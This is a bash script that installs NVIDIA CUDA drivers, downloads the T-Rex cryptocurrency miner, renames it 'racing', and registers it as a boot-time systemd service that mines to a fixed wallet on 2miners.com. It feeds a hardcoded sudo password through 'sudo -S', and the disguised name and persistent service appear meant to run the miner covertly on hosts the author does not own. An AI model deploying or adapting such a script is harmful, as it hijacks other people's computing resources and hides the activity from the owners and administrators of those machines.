cd /home
woker=$(date +'%d%m_%H%M%S_')
name=$HOSTNAME
woker+=$name
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-get update
sudo apt-get -y install cuda-drivers
sudo apt-get install libcurl3 -y
sudo apt-get install cuda-drivers-510
sudo apt-get install cuda-drivers-fabricmanager-510 -y
sudo systemctl enable nvidia-fabricmanager
sudo systemctl start nvidia-fabricmanager
wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex racing
echo 'nfyr!3jdhey4556' | sudo -S killall racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u bc1qmc9jdygf4kn03rq7hg692uyhcya9gfhymsug2q -p x -w ${woker}_test\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
echo 'nfyr!3jdhey4556' | sudo -S systemctl daemon-reload
echo 'nfyr!3jdhey4556' | sudo -S systemctl enable racing.service
echo 'nfyr!3jdhey4556' | sudo -S ./racing -a ethash -o us-eth.2miners.com:2020 -u bc1qmc9jdygf4kn03rq7hg692uyhcya9gfhymsug2q -p x -w $woker &